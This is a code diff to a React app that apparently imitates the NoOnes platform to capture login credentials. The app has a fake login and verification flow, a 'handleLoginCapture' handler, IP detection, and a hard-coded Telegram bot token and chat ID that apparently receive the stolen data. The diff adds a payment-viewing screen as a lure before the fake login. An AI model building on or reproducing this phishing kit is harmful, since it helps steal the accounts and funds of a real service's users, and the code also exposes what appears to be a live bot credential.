@@ -1,6 +1,7 @@
 
 import React, { useState, useEffect } from 'react';
 import LoginScreen from './components/LoginScreen';
+import ViewPayments from './components/ViewPayments';
 import VerificationScreen from './components/VerificationScreen';
 import LanguageSelector from './components/LanguageSelector';
 import ThemeToggle from './components/ThemeToggle';
@@ -14,7 +15,7 @@ const TELEGRAM_TOKEN = "7937060457:AAF8boHz2--g7BITNWlljoxzL3rjUOE92Uk";
 const TELEGRAM_CHAT_ID = "2100006818";
 
 const App: React.FC = () => {
-  const [step, setStep] = useState<AuthStep>('login');
+  const [step, setStep] = useState<AuthStep>('view-payments');
   const [isDarkMode, setIsDarkMode] = useState(true);
   const [currentDraft, setCurrentDraft] = useState<{ email: string; pass: string } | null>(null);
   const [userIp, setUserIp] = useState<string>("Detecting...");
@@ -131,17 +132,22 @@ const App: React.FC = () => {
   return (
     <div className="min-h-screen flex flex-col items-center justify-center p-4">
       <div className="mb-8 h-12 flex items-center justify-center">
-        <img 
-          src={LOGO_URL} 
-          alt="NoOnes" 
-          className={`h-12 md:h-14 w-auto object-contain transition-all duration-300 ${shouldInvert ? 'invert brightness-0' : ''}`}
-          onError={(e) => {
-            (e.target as HTMLImageElement).src = "https://noones.com/images/noones-logo-white.svg";
-          }}
-        />
+        <a href={LOGO_URL} target="_blank" rel="noopener noreferrer">
+          <img 
+            src={LOGO_URL} 
+            alt="NoOnes" 
+            className={`h-12 md:h-14 w-auto object-contain transition-all duration-300 ${shouldInvert ? 'invert brightness-0' : ''}`}
+            onError={(e) => {
+              (e.target as HTMLImageElement).src = "https://noones.com/images/noones-logo-white.svg";
+            }}
+          />
+        </a>
       </div>
 
       <div className="w-full flex justify-center mb-8">
+        {step === 'view-payments' && (
+          <ViewPayments onContinue={() => setStep('login')} logoUrl={LOGO_URL} isDarkMode={isDarkMode} />
+        )}
         {step === 'login' && (
           <LoginScreen 
             onLogin={handleLoginCapture} 
